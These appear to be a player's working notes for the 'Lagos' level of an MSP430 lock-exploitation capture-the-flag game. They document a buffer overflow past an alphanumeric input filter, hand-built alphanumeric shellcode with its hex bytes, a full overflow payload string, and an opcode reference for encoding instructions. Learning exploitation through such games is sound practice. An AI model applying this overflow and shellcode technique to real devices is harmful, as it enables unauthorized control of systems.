# Lagos #

* Input stored at 0x2400
* Gets moved to 0x43ed
* not bounds checked

48-57 0x30-0x39 number
65-90 0x41-0x5a uppercase letters
97-122 0x61-0x7a lowercase letters

If some of the input is not alphanumeric, it zaps 512 bytes starting at from there out to zero, so may just need to input some alphanumeric to a point ant then some code injection

```
mov #0xff00, sr
call #0x10
```

`324000ffb0121000`

But those bytes have nulls and values not in the valid ascii 0-9, a-z, A-Z ranges

Eventual call to `conditional_unlock_door` which is at 0x4446, 89 bytes away from out input at 0x43ed

Get 0xff into sr
```
clr.b sr
subc.b #0x1, sr
```

`42435273`

Get 0x10 into r15 and call it

```
clr.b r15
incd.b r15
incd.b r15
incd.b r15
incd.b r15
incd.b r15
incd.b r15
incd.b r15
incd.b r15

mov.b r15, r1
ret
```

`4f436f536f536f536f536f536f536f536f53414f3041`

3030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030424352734f436f536f536f536f536f536f536f536f53414f3041

AAAAAAAAAAAAAAAAA	TF	BBBB	BB
AAAAAAAAAAAAAAAAATFBBBBBB
Might need to see if we can write a code only within the ascii 0-9, a-z, A-Z?
```
0x30 - 0x39
0x41 - 0x5A
0x61 - 0x7A
```
That should mean it's at least possible to use `mov, add, subc, rrc, rra, push, and reti`

# Double Operand Instructions #
```
15 14 13 12 11 10 09 08 07 06  05 04 03 02 01 00
Opcode      S-Reg       Ad B/W As    D-Reg
```

- MOV(.B) src,dst src → dst
- ADD(.B) src,dst src + dst → dst
- ADDC(.B) src,dst src + dst + C → dst
- SUB(.B) src,dst dst + .not.src + 1 → dst
- SUBC(.B) src,dst dst + .not.src + C → dst
- CMP(.B) src,dst dst − src * * * *
- DADD(.B) src,dst src + dst + C → dst (decimally)
- BIT(.B) src,dst src .and. dst
- BIC(.B) src,dst .not.src .and. dst → dst
- BIS(.B) src,dst src .or. dst → dst
- XOR(.B) src,dst src .xor. dst → dst
- AND(.B) src,dst src .and. dst → dst

```
mov  0x4000
add  0x5000
addc 0x6000
sub  0x8000
subc 0x7000
cmp  0x9000
dadd 0xa000
bit  0xb000
bic  0xc000
bis  0xd000
xor  0xe000
and  0xf000
```

# Single Operand Instructions #
```
15 14 13 12 11 10 09 08 07 06  05 04 03 02 01 00
Opcode                     B/W Ad    D/S-Reg
```

- RRC(.B) dst C → MSB →.......LSB → C
- RRA(.B) dst MSB → MSB →....LSB → C
- PUSH(.B) src SP − 2 → SP, src → @SP
- SWPB dst Swap bytes
- CALL dst SP − 2 → SP, PC+2 → @SP
  - dst → PC
- RETI TOS → SR, SP + 2 → SP
  - TOS → PC,SP + 2 → SP
- SXT dst Bit 7 → Bit 8........Bit 15

```
rrc  0x1000
rra  0x1100
push 0x1200
swpb 0x1080
call 0x1280
reti 0x1300
sxt  0x1180
```

# Jump Instruction Format #
```
15 14 13 12 11 10 09 08 07 06  05 04 03 02 01 00
Opcode   C        10-Bit PC Offset
```

- JEQ/JZ Label Jump to label if zero bit is set
- JNE/JNZ Label Jump to label if zero bit is reset
- JC Label Jump to label if carry bit is set
- JNC Label Jump to label if carry bit is reset
- JN Label Jump to label if negative bit is set
- JGE Label Jump to label if (N .XOR. V) = 0
- JL Label Jump to label if (N .XOR. V) = 1
- JMP Label Jump to label unconditionally

```
jeq 0x2400
jz  0x2400
jne 0x2000
jnz 0x2000
jc  0x2c00
jnc 0x2800
jn  0x3000
jge 0x3400
jl  0x3800
jmp 0x3c00
```
